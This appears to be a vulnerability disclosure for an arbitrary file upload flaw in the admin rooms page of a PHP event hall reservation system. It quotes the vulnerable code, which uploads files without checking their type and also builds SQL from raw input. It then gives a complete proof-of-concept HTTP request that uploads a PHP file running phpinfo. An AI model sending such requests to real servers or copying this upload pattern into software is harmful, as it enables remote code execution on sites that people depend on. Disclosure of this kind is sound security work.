# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Arbitrary File Upload rooms.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/rooms.php

## Code
```php
if (isset($_POST['submit'])) {
    if (empty($_POST['roomname'])) {
        $errors['roomname'] = "Enter the roomname field";
    } else {
        $roomname = $_POST['roomname'];
    }
    if (empty($_POST['roomnum'])) {
        $errors['roomnum'] = "Enter the roomnum field";
    } else {
        $roomnum = $_POST['roomnum'];
    }
    if (empty($_POST['location'])) {
        $errors['location'] = "Enter the Location";
    } else {
        $location = $_POST['location'];
    }
    if (empty($_POST['roomid'])) {
        $errors['roomid'] = "Enter the roomid field";
    } else {
        $roomid = $_POST['roomid'];
    }
    $capacity = $_POST['capacity'];
    $description = $_POST['description'];
    $query = "INSERT INTO tbl_rooms(room_name,capacity,location,description,room_number) VALUES('$roomname','$capacity','$location','$description','$roomnum')";
    $result = mysqli_query($conn, $query);

    if (!$result) { ?>
        <script>alert("Already Exisits");</script>
        <?php
    } else {
        var_dump('huatong');
        $filename = $_FILES["imgfile"]["name"];
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

        $query1 = "SELECT * FROM tbl_rooms WHERE room_number='$roomnum'";
        $result1 = mysqli_query($conn, $query1);
        $row = mysqli_fetch_assoc($result1);
        $roomid = $row['room_id'];
        $filename = $roomid . '.' . $ext;
        $tempname = $_FILES["imgfile"]["tmp_name"];
        $folder = "../images/" . $filename;
        $upload = move_uploaded_file($tempname, $folder);
        $query2 = "UPDATE tbl_rooms SET img_name='$filename' WHERE room_id='$roomid'";
        $result2 = mysqli_query($conn, $query2);
        if (!$result2) {
            echo "Error" . mysqli_error($conn);
        }
    }
}
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/rooms.php?id= HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1004


------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="submit"

92asd
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="roomname"

92asd
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="roomnum"

92asd
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="Username"

asdasd
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="location"

asdasdasd
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="roomid"

NoChiZPlZ
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="capacity"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="description"

asdasdasd
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="imgfile"; filename="nochizplz.php"
Content-Type: text/php

<?php phpinfo(); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/86bd7796-d148-4868-8bc0-065d5db33946)

![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/3a0fb55c-affc-4bb8-8537-8aa7d922a04a)

